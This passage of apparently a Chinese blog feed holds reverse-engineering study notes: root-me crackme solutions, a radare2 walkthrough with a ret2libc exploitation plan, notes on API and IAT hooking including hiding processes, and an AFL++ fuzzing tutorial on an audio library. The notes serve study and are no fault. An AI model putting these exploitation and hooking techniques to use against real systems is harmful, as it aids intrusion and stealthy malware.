<h2 id="ELF-x86-CrackPass"><a href="#ELF-x86-CrackPass" class="headerlink" title="ELF x86 - CrackPass"></a>ELF x86 - CrackPass</h2><p><code>gdb-peda$ help x</code><br>Examine memory: x/FMT ADDRESS.</p>
<hr>
<p><code>gdb-peda$ print/t $ebx</code><br>二进制打印寄存器</p>
<hr>
<pre><code>set $ZF = 6
set $eflags |= (1 &lt;&lt; $ZF)</code></pre>
<p>设定ZF值为1</p>
<hr>
<p><code>show</code></p>
<hr>
<p><code>where</code><br>显示当前位置</p>
<hr>
<p><code>MOVZX</code> 指令（进行全零扩展并传送）将源操作数复制到目的操作数，并把目的操作数 扩展到 16 位或 32 位。</p>
<hr>
<h3 id="r2-图形模式下，如何跳转和返回函数"><a href="#r2-图形模式下，如何跳转和返回函数" class="headerlink" title="r2 图形模式下，如何跳转和返回函数"></a>r2 图形模式下，如何跳转和返回函数</h3><p>图形模式下，按<code>o</code>进行跳转<br>按<code>u</code>返回上一个函数</p>
<hr>
<p>ff07031d6fb052490149f44b1d5e94f1592b6bac93c06ca9</p>
<p>25260060504_VE_T25_<em>t</em>_</p>
<hr>
<p><code>Usage: jump LOCATION</code><br>Give as argument either LINENUM or *ADDR, where ADDR is an express</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向_root_me_4</title>
    <url>/2020/10/19/%E9%80%86%E5%90%91_root_me_4/</url>
    <content><![CDATA[<h2 id="ELF-—-Random-Crackme"><a href="#ELF-—-Random-Crackme" class="headerlink" title="ELF — Random Crackme"></a>ELF — Random Crackme</h2><p>将<code>magic</code>之前的内容都删除，因为之前的垃圾内容，使得不能运行ELF文件<br><code>ELF files start with 7f 45 4c 46</code><br><a href="https://imgchr.com/i/0v8xN8"><img src="https://s1.ax1x.com/2020/10/19/0v8xN8.jpg" alt="0v8xN8.jpg" border="0" /></a></p>
<a id="more"></a>
<hr>
<p><code>r2 -ww ./ch3.bin</code><br><code>-w</code>          open file in write mode<br><code> ww foobar</code>            write wide string ‘f\x00o\x00o\x00b\x00a\x00r\x00’<br> <code>wx 9090</code>     write two intel nops</p>
<pre><code>[0x080482f0]&gt; wx eb @ 0x0804841A</code></pre>
<p><code>Short Jump</code>（短跳转）机器码 <code>EB</code></p>
<hr>
<p><a href="https://imgchr.com/i/0vGPjs"><img src="https://s1.ax1x.com/2020/10/19/0vGPjs.jpg" alt="0vGPjs.jpg" border="0" /></a></p>
<p>用time,rand产生随机密码<br>gdb 直接设置<code>eip</code> 跳过代码</p>
<pre><code>set $eip=xxxx</code></pre>
<p>再运行<code>c</code></p>
<hr>
<pre><code>binwalk crackme_wtf</code></pre>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">r2</span><br><span class="line">aaa</span><br><span class="line">afl <span class="comment">//list function</span></span><br><span class="line">s sym.main</span><br></pre></td></tr></table></figure>

<h2 id="ELF-x64-Crackme-automating"><a href="#ELF-x64-Crackme-automating" class="headerlink" title="ELF x64 - Crackme automating"></a>ELF x64 - Crackme automating</h2><p>str=”break\n”<br>var4=0<br>var8=0xf7<br><code>(MOVSXD r64, r/m32</code> Move doubleword to quadword with sign-extension.<br>这是64位代码中的指令，它将32位寄存器或地址转换为32位值，并将其符号扩展为64位寄存器。 符号扩展采用源的最高位（符号位）的值，并使用它来填充目标的所有高位。)</p>
<p>var4+str<br>位置加var4<br>(<code>movzx</code>是将源操作数的内容拷贝到目的操作数，并将该值用0扩展至16位或者32位。但是它只适用于无符号整数。 他大致下面的三种格式。)</p>
<p>str[0]<br><code>MOVSX</code> 指令（进行符号扩展并传送）将源操作数内容复制到目的操作数，并把目的操作数符号扩展到 16 位或 32 位。这条指令只用于有符号整数，</p>
<p><code>xor (str[0] ,0xa3)=0xf7</code></p>
<p><code>str[1]</code></p>
<p><code>cmp eax, 0xf7</code></p>
<p>注：上篇有自动化代码链接</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向 学习r2 part2</title>
    <url>/2020/09/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0r2part2/</url>
    <content><![CDATA[<h2 id="逆向-学习r2-part2"><a href="#逆向-学习r2-part2" class="headerlink" title="逆向 学习r2 part2"></a>逆向 学习r2 part2</h2><p><a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/">https://www.megabeets.net/a-journey-into-radare-2-part-2/</a></p>
<p>在NX和ASLR的保护下</p>
<hr>
<a id="more"></a>

<p><code>$ r2 -d megabeets_0x2</code><br><code>-d </code> – Open in the debug mode<br>aas – Analyze functions, symbols and more</p>
<p><code>dcu address      Continue until address</code></p>
<p><code>VV</code></p>
<p><code>pdf @ sym.beet</code></p>
<hr>
<h3 id="ragg2"><a href="#ragg2" class="headerlink" title="ragg2"></a>ragg2</h3><p><code>ragg2</code>, which allows us to generate a cyclic pattern called De Bruijn Sequence and check the exact offset where our payload overrides the buffer.<br>它允许我们生成一个称为De Bruijn Sequence的循环模式，并检查有效载荷覆盖缓冲区的确切偏移量</p>
<pre><code>-P [size]       prepend debruijn pattern
 -q [fragment]   debruijn pattern offset
 -r              show raw bytes instead of hexpairs</code></pre>
<p><code>$ ragg2 -P 100 -r</code><br><em>之前SEH攻击 应该有用过</em></p>
<hr>
<h3 id="rarun2"><a href="#rarun2" class="headerlink" title="rarun2"></a>rarun2</h3><p><code>rarun2</code>用作启动器，用于运行具有不同环境，参数，权限，目录的程序，并覆盖默认文件描述符（例如stdin）。<br>当您必须使用长参数运行程序，将大量数据传递给stdin或类似的东西时，这很有用，这通常是利用二进制文件的情况。</p>
<hr>
<pre><code>$ ragg2 -P 200 -r &gt; pattern.txt
$ cat pattern.txt</code></pre>
<hr>
<pre><code>$ vim profile.rr2
$ cat profile.rr2
#!/usr/bin/rarun2
stdin=./pattern.txt</code></pre>
<hr>
<p><code>$ r2 -r profile.rr2 -d megabeets_0x2</code><br>-r [rarun2]  specify rarun2 profile to load (same as -e dbg.profile=X)<br>-d           debug the executable ‘file’ or running process ‘pid’</p>
<hr>
<p>信号是发送到同一进程中的某个进程或特定线程的异步通知，以便将发生的事件通知给它。<br>·当SIGSEGV（11）信号做出无效的虚拟内存引用或分段错误时，即在执行分段违规时，将其发送到进程。</p>
<hr>
<p><code>wopO value </code>       Finds the given value into a De Bruijn Pattern at current offset</p>
<p>| dr                     Show ‘gpr’ registers<br>wopO <code>dr eip</code><br>没有成功<br>wopO 0x41417641</p>
<hr>
<p>i   Get info from opened file (see rabin2’s manpage)<br>ii                 Imports<br>iip 更简明</p>
<hr>
<p>The plan</p>
<ol>
<li>Leak the real address of puts</li>
<li>Calculate the base address of libc</li>
<li>Calculate the address of system</li>
<li>Find an address in libc that contains the string /bin/sh</li>
<li>Call system with /bin/sh and spawn a shell</li>
</ol>
<hr>
<p><code>过程链接表Procedure Linkage Table（PLT)</code>是一个内存结构，其中包含外部功能的代码存根，这些函数的地址在链接时是未知的。<br>·每当我们在.text段中看到对函数的CALL指令时，都不会直接调用该函数。<br>·相反，它在PLT处调用存根代码，例如<code>func_name @ plt</code>。<br>然后，存根跳转到<code>全局偏移表（GOT）</code>中为此功能列出的地址。<br>如果它是此功能的第一个CALL，则<code>GOT条目将指向PLT，后者将调用动态链接器，该链接器将解析所需功能的实际地址</code><br>下次调用func_name @ plt时，存根直接从<code>GOT获取功能地址</code>。<br>((少了动态链接步骤？？))</p>
<hr>
<p><code>pwntools </code>漏洞利用框架</p>
<hr>
<pre><code>~ character is radare’s internal grep
[0xf7763b30]&gt; # the address of puts@plt:
[0xf7763b30]&gt; ?v sym.imp.puts //Usage: ?v[id][ num]  # Show value
0x08048390
[0xf7763b30]&gt; ?v reloc.puts</code></pre>
<p><code>sy按tab键自动搜寻</code></p>
<hr>
<pre><code>Usage: dmi    # List/Load Symbols
All these paddr=0x000xxxxx are the offsets of the function from libc base. </code></pre>
<hr>
<p>为此，我们将使用radare的搜索功能。<br>·默认情况下，radare正在dbg.map中搜索，这是当前的内存映射。<br>·我们要搜索所有内存映射，因此我们需要对其进行配置：<br>[0x080483d0]&gt; e search.in = dbg.maps<br>要以可视方式配置雷达，请使用Ve</p>
<hr>
<pre><code>Usage: /[!bf] [arg]  Search stuff

dmm   List modules of target process
[0x080483d0]&gt; ?X 0xf7700768-0xf7599000</code></pre>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程核心原理_little_summary</title>
    <url>/2020/10/06/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86_little_summary/</url>
    <content><![CDATA[<h3 id="INT-和-IAT"><a href="#INT-和-IAT" class="headerlink" title="INT 和 IAT"></a>INT 和 IAT</h3><p>INT  是rva数组，INT表示数组首地址 数组元素是一个地址 指向由一个2字节ordinall地址和函数名称组成的结构体  第一个值地址指向第一个结构体</p>
<p>如果IAT存在于 选择头中IAT表明的地址中 相应没有写权限也没事</p>
<p>INT和IAT指向内容有时相同 表示地址肯定不同 因为保存在不同地址 所指内容相同</p>
<a id="more"></a>
<hr>
<h3 id="进程内存转储"><a href="#进程内存转储" class="headerlink" title="进程内存转储"></a>进程内存转储</h3><p>OLLYGDB插件？？ dump命令<br>是解压缩运行时，将内存转为文件，方便查看</p>
<hr>
<h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>使用CALL指令将接下来的在代码间的字符串数据地址压入栈，然后直接接下来运行命令</p>
<p>CALL EAX<br>EAX保存函数地址<br>32位保存返回内容</p>
<hr>
<h3 id="top-命令-linux"><a href="#top-命令-linux" class="headerlink" title="top 命令 (linux)"></a>top 命令 (linux)</h3><p>查看 CPU 时间在 User space 与 Kernel Space 之间的分配情况</p>
<hr>
<h3 id="SEH链"><a href="#SEH链" class="headerlink" title="SEH链"></a>SEH链</h3><p>ollydbg VIEW-SEH CHAIN</p>
<hr>
<h3 id="API钩取"><a href="#API钩取" class="headerlink" title="API钩取"></a>API钩取</h3><p>windows 中内核模式所有代码共用一个虚拟空间地址，用API传<br>e1 = 9Fh =&gt; 0fh*2^7 = 780h</p>
<p>使用常规系统资源的API会经由kernel32.dll和ntdll.dll不断向下调用，最后经由SYSENTER命令进入内核模式</p>
<p><img src="https://s1.ax1x.com/2020/10/06/0N35f1.png" alt="0N35f1.png"></p>
<hr>
<p><img src="https://s1.ax1x.com/2020/10/06/0N3vtA.png" alt="0N3vtA.png"></p>
<hr>
<h3 id="动态方法常用-调试和注入"><a href="#动态方法常用-调试和注入" class="headerlink" title="动态方法常用 调试和注入"></a>动态方法常用 调试和注入</h3><h4 id="方法1：调试"><a href="#方法1：调试" class="headerlink" title="方法1：调试"></a>方法1：调试</h4><p>异常必须处理为EXCEPTION_BREAKPOINT 汇编指令为int 3 IA-32指令为0xCC </p>
<p>用异常获取API的控制</p>
<p>线程上下文，（执行完一个线程时间片，执行另一个），也就是各个寄存器信息，保存在CONTEXT结构体中。</p>
<p>CONTEXT.esp</p>
<p>api钩取 获取某个API的控制权</p>
<h4 id="方法2：DLL注入"><a href="#方法2：DLL注入" class="headerlink" title="方法2：DLL注入"></a>方法2：DLL注入</h4><p>setwindowstextA 表示ASCII<br>setwindowstextW 表示宽字符 win中为Unicode码</p>
<h3 id="IAT钩取"><a href="#IAT钩取" class="headerlink" title="IAT钩取"></a>IAT钩取</h3><p>通过注入DLL，修改IAT中指向某API的地址改为指向自己API的地址，自己的函数再去调用某API，来达到修改的目的</p>
<hr>
<h3 id="搜索API"><a href="#搜索API" class="headerlink" title="搜索API"></a>搜索API</h3><p><strong>在用ollydng进行内部模块call 搜索时，先选取对的模块。右键-select moudle</strong><br>在用ollydbg 中<code> search for name</code>命令</p>
<hr>
<h3 id="API代码修改"><a href="#API代码修改" class="headerlink" title="API代码修改"></a>API代码修改</h3><p>将API头五个字节 修改 为JMP XXXXXXXX<br>即跳转到注入的函数中</p>
<p>通过将ntdll.ZwQuerySystemInformation() 函数形成的链表中删除进程信息即可做到隐藏相关进程。</p>
<h3 id="全局API钩取"><a href="#全局API钩取" class="headerlink" title="全局API钩取"></a>全局API钩取</h3><p>通过修改ntdll.ZwResumeThread() API</p>
<h3 id="热补丁-hot-patch"><a href="#热补丁-hot-patch" class="headerlink" title="热补丁 hot patch"></a>热补丁 hot patch</h3><p>修改7字节代码<br>1.二次跳转<br>两字节跳到指令上面，用五字节跳到自己的函数地址<br>2.不用脱钩，地址+2字节，就可正常运行</p>
<p>ia-32 E9 表示far jmp 五字节。<br><code>E9 XXXXXXXX=要跳转的地址-当前指令地址-当前指令长度（5）</code></p>
<p>EB 表示 short jmp 两字节<br>依托当前EIP 在-128~127范围间跳转<br><code>XX=要跳转的地址-当前指令地址-当前指令长度（2）</code></p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>AFL++使用</title>
    <url>/2021/06/07/afl++/</url>
    <content><![CDATA[<h2 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h2><p>模糊测试 （fuzz testing, fuzzing）是一种软件测试技术。其核心思想是将自动或半自动生成的随机数据输入到一个程序中，并监视程序异常，如崩溃，断言（assertion）失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。</p>
<p>模糊测试最早由威斯康星大学的Barton Miller于1988年提出。他们的工作不仅使用随机无结构的测试数据，还系统的利用了一系列的工具去分析不同平台上的各种软件，并对测试发现的错误进行了系统的分析。此外，他们还公开了源代码，测试流程以及原始结果数据。</p>
<p>模糊测试工具主要分为两类，变异测试（mutation-based）以及生成测试（generation-based）。模糊测试可以被用作白盒，灰盒或黑盒测试。文件格式与网络协议是最常见的测试目标，但任何程序输入都可以作为测试对象。常见的输入有环境变量，鼠标和键盘事件以及API调用序列。甚至一些通常不被考虑成输入的对象也可以被测试，比如数据库中的数据或共享内存。</p>
<p>对于安全相关的测试，那些跨越可信边界的数据是最令人感兴趣的。比如，模糊测试那些处理任意用户上传的文件的代码比测试解析服务器配置文件的代码更重要。因为服务器配置文件往往只能被有一定权限的用户修改。</p>
<a id="more"></a>
<h2 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h2><p>AFL是fuzzing使用率较高的工具，全称是American Fuzzy Lop，由Google安全工程师Michał Zalewski开发的一款开源fuzzing测试工具，可以高效地对二进制程序进行fuzzing，挖掘可能存在的内存安全漏洞，如栈溢出、堆溢出、UAF、double free等。由于需要在相关代码处插桩，因此AFL主要用于对开源软件进行测试。配合QEMU等工具，也可对闭源二进制代码进行fuzzing，但执行效率会受到影响。AFL基于覆盖引导（Coverage-guided），它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p>
<p>AFL对开源代码进行fuzzing的过程可以用以下五步描述：</p>
<ol>
<li>从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）</li>
<li>选择一些输入文件，作为初始测试集加入输入队列（queue）</li>
<li>将队列中的文件按一定的策略进行 “突变”</li>
<li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中</li>
<li>上述过程会一直循环进行，期间触发了crash的文件会被记录下来</li>
</ol>
<h2 id="AFLplusplus"><a href="#AFLplusplus" class="headerlink" title="AFLplusplus"></a>AFLplusplus</h2><p>AFL++ 是 AFL 的高级分支——更快的速度、更多更好的突变、更多更好的工具、自定义模块支持等。</p>
<h2 id="AudioFile"><a href="#AudioFile" class="headerlink" title="AudioFile"></a>AudioFile</h2><p>一个简单的头文件 C++ 库，用于读写音频文件。这是我fuzzing的目标。</p>
<h2 id="FUZZING"><a href="#FUZZING" class="headerlink" title="FUZZING"></a>FUZZING</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>最简单的方式就是使用docker</p>
<p><code>docker pull aflplusplus/aflplusplus</code><br><code>docker run -ti -v /location/of/your/target:/src aflplusplus/aflplusplus</code></p>
<h3 id="准备被测试源码"><a href="#准备被测试源码" class="headerlink" title="准备被测试源码"></a>准备被测试源码</h3><p>根据官方提供的示例代码略做修改做为测试代码。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _USE_MATH_DEFINES</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;AudioFile.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> examples</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">writeSineWaveToAudioFile</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">loadAudioFileAndPrintSummary</span><span class="params">(<span class="keyword">char</span> *)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">loadAudioFileAndProcessSamples</span><span class="params">(<span class="keyword">char</span> *)</span></span>;</span><br><span class="line">&#125; <span class="comment">// namespace examples</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//进行AFL Persistent mode</span></span><br><span class="line">    <span class="keyword">while</span> (__AFL_LOOP(<span class="number">10000</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/** Loads an audio file and prints key details to the console*/</span></span><br><span class="line">        examples::loadAudioFileAndPrintSummary(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** Loads an audio file and processess the samples */</span></span><br><span class="line">        examples::loadAudioFileAndProcessSamples(argv[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> examples</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">writeSineWaveToAudioFile</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;**********************&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Running Example: Write Sine Wave To Audio File&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;**********************&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">                  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. Let&#x27;s setup our AudioFile instance</span></span><br><span class="line">        AudioFile&lt;<span class="keyword">float</span>&gt; a;</span><br><span class="line">        a.setNumChannels(<span class="number">2</span>);</span><br><span class="line">        a.setNumSamplesPerChannel(<span class="number">44100</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. Create some variables to help us generate a sine wave</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">float</span> sampleRate = <span class="number">44100.f</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">float</span> frequencyInHz = <span class="number">440.f</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. Write the samples to the AudioFile sample buffer</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.getNumSamplesPerChannel(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> channel = <span class="number">0</span>; channel &lt; a.getNumChannels(); channel++)</span><br><span class="line">            &#123;</span><br><span class="line">                a.samples[channel][i] = <span class="built_in">sin</span>((<span class="keyword">static_cast</span>&lt;<span class="keyword">float</span>&gt;(i) / sampleRate) * frequencyInHz * <span class="number">2.f</span> * M_PI);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. Save the AudioFile</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> filePath = <span class="string">&quot;sine-wave.wav&quot;</span>; <span class="comment">// change this to somewhere useful for you</span></span><br><span class="line">        a.save(<span class="string">&quot;sine-wave.wav&quot;</span>, AudioFileFormat::Wave);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">loadAudioFileAndPrintSummary</span><span class="params">(<span class="keyword">char</span> *file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;**********************&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Running Example: Load Audio File and Print Summary&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;**********************&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">                  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. Set a file path to an audio file on your machine</span></span><br><span class="line">        <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> filePath = <span class="built_in">std</span>::<span class="built_in">string</span>(file);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. Create an AudioFile object and load the audio file</span></span><br><span class="line">        AudioFile&lt;<span class="keyword">float</span>&gt; a;</span><br><span class="line">        <span class="keyword">bool</span> loadedOK = a.load(filePath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** If you hit this assert then the file path above</span></span><br><span class="line"><span class="comment">         probably doesn&#x27;t refer to a valid audio file */</span></span><br><span class="line">        assert(loadedOK);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. Let&#x27;s print out some key details</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bit Depth: &quot;</span> &lt;&lt; a.getBitDepth() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sample Rate: &quot;</span> &lt;&lt; a.getSampleRate() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Num Channels: &quot;</span> &lt;&lt; a.getNumChannels() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length in Seconds: &quot;</span> &lt;&lt; a.getLengthInSeconds() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">loadAudioFileAndProcessSamples</span><span class="params">(<span class="keyword">char</span> *file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;**********************&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Running Example: Load Audio File and Process Samples&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;**********************&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">                  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. Set a file path to an audio file on your machine</span></span><br><span class="line">        <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> inputFilePath = <span class="built_in">std</span>::<span class="built_in">string</span>(file);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. Create an AudioFile object and load the audio file</span></span><br><span class="line">        AudioFile&lt;<span class="keyword">float</span>&gt; a;</span><br><span class="line">        <span class="keyword">bool</span> loadedOK = a.load(inputFilePath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** If you hit this assert then the file path above</span></span><br><span class="line"><span class="comment">         probably doesn&#x27;t refer to a valid audio file */</span></span><br><span class="line">        assert(loadedOK);</span><br><span class="line">        <span class="comment">// 3. Let&#x27;s apply a gain to every audio sample</span></span><br><span class="line">        <span class="keyword">float</span> gain = <span class="number">0.5f</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.getNumSamplesPerChannel(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> channel = <span class="number">0</span>; channel &lt; a.getNumChannels(); channel++)</span><br><span class="line">            &#123;</span><br><span class="line">                a.samples[channel][i] = a.samples[channel][i] * gain;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">// namespace examples</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我开启了AFL的Persistent Mode，开启方法是在调用函数前加上下面的代码。</p>
<p><code>while (__AFL_LOOP(10000)) &#123;&#125;</code></p>
<p>Persistent Mode消除重复 fork() 调用和相关操作系统开销的需要，因为有些函数只要简单重置状态值就可以处理不同的输入文件，这样一个进程就可以一直执行。在迭代了10000次后，AFL会重新启动进程，这最大限度地降低了内存泄漏和类似错误的影响。</p>
<h3 id="插桩编译"><a href="#插桩编译" class="headerlink" title="插桩编译"></a>插桩编译</h3><ol>
<li><p>首先运行docker镜像</p>
<p><code>docker run -ti -v /location/of/your/target:/src aflplusplus/aflplusplus</code></p>
<p>路径是源代码所在目录，这里需要填入绝对路径。</p>
</li>
<li><p>准备命令</p>
<p><code>export AFL_USE_ASAN=1</code>表示编译器开启 -fsanitize=address 进行编译</p>
<p><code>sudo afl-system-config</code>这会重新配置系统以获得最佳Fuzzing速度 </p>
</li>
<li><p>编译</p>
<p>AudioFile原本是用cmake生成Makefile进行编译，但我运行的时候编译不成功。所以改为直接编写Makefile编译，将头文件和源文件放在同一目录下。</p>
<p><code>make CXX=afl-clang-fast++</code></p>
</li>
</ol>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">objects :=examples.o</span><br><span class="line"></span><br><span class="line">CXX=g++</span><br><span class="line">CFLAGS+=-g</span><br><span class="line">EXE=first_try</span><br><span class="line"></span><br><span class="line"><span class="section">first_try: <span class="variable">$(objects)</span> </span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$(EXE)</span> <span class="variable">$(objects)</span> </span><br><span class="line"><span class="section">examples.o: examples.cpp AudioFile.h</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CFLAGS)</span> -c examples.cpp</span><br><span class="line"></span><br><span class="line">.PHONY : clean</span><br><span class="line">clean :</span><br><span class="line">	rm <span class="variable">$(objects)</span> first_try</span><br></pre></td></tr></table></figure>

<h3 id="处理种子语料库"><a href="#处理种子语料库" class="headerlink" title="处理种子语料库"></a>处理种子语料库</h3><p>输入文件选择AudioFile中原有的示例音频文件。</p>
<p><code>afl-cmin -i in/ -o in_cmin -m none -- ./first_try @@</code></p>
<p>使用 afl++ 工具 afl-cmin 从语料库中删除不会在目标中生成新路径的输入。</p>
<p><code>@@</code>表示是文件输入，如果是标准输入去除<code>@@</code>即可。</p>
<h3 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h3><p><code>afl-fuzz -i in_cmin/ -o out -m none -- ./first_try @@</code></p>
<h3 id="处理crashes"><a href="#处理crashes" class="headerlink" title="处理crashes"></a>处理crashes</h3><p>会产生crash的文件放在out/default/crashes中，编译测试crashes的程序，去除掉源代码中的AFL_LOOP</p>
<p><code>g++ -g -fsanitize=address -o asantry examples.cpp AudioFile.h</code> </p>
<img src="/images/Screenshot at 2021-06-04 14-43-56.png" alt="Screenshot at 2021-06-04 14-43-56" style="zoom: 67%;" />

<p>之后逐个输入crash，查看结果。</p>
<ol>
<li><p>第一个heap buff overflowin位于AudioFile.h:502，decodeWaveFile()函数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./asantry ./out/default/crashes/id\:000005\,sig\:06\,src\:000006\,time\:84641\,op\:havoc\,rep\:2</span><br></pre></td></tr></table></figure>

<p>asan结果：</p>
